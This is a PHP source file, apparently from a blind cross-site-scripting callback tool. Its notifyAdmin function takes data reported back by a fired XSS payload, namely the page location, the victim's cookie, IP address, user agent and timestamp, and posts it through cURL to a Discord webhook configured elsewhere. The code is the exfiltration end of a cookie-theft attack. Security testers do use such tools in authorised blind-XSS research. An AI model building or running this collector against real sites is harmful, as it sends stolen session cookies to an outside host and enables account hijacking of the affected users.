<?php
require_once '../config/config.php';

function notifyAdmin($data) {
    // Webhook URL is retrieved from config.php
    $webhook_url = WEBHOOK_URL;
    
    // Format the message payload for Discord
    $payload = json_encode([
        'content' => "🚨 Blind XSS triggered!\n**Location:** " . $data['location'] . 
                     "\n**Cookie:** " . $data['cookie'] . 
                     "\n**IP:** " . $data['ip'] . 
                     "\n**User-Agent:** " . $data['user_agent'] . 
                     "\n**Timestamp:** " . $data['timestamp'],
        'username' => "XSS Bot"  // Display name for the bot
    ]);

    // Send notification using cURL with error handling
    $ch = curl_init($webhook_url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    $result = curl_exec($ch);

    if (curl_errno($ch)) {
        error_log("cURL error when sending notification: " . curl_error($ch));
    }
    curl_close($ch);
}
?>